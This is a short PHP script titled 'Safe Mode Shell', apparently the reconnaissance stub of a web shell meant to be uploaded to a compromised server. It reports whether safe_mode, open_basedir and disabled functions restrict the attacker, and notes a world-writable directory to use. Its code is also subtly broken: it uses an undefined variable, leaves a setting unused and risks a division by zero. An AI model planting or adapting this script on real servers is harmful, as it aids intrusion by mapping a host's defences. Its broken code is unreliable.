<?php
echo "<head><title>Safe Mode Shell</title></head>"; 
$tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
   $safemode = true;
   $hsafemode = "<font color=\"red\">ON (secure)</font>";
}
else {
	$safemode = false; 
	$hsafemode = "<font color=\"green\">OFF (not secure)</font>";
}
echo("Safe-mode: $hsafemode");
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {
	$openbasedir = true; 
	$hopenbasedir = "<font color=\"red\">".$v."</font>";
}
else {
	$openbasedir = false; 
	$hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";
}
echo("<br>");
echo("Open base dir: $hopenbasedir");
echo("<br>");
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){
	echo "<font color=green>NONE</font></b>";
}
else{
	echo "<font color=red>$df</font></b>";
}
$free = @diskfreespace($dir);
if (!$free) {
	$free = 0;
}
$all = @disk_total_space($dir);
if (!$all) {
	$all = 0;
}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);

exit;
?>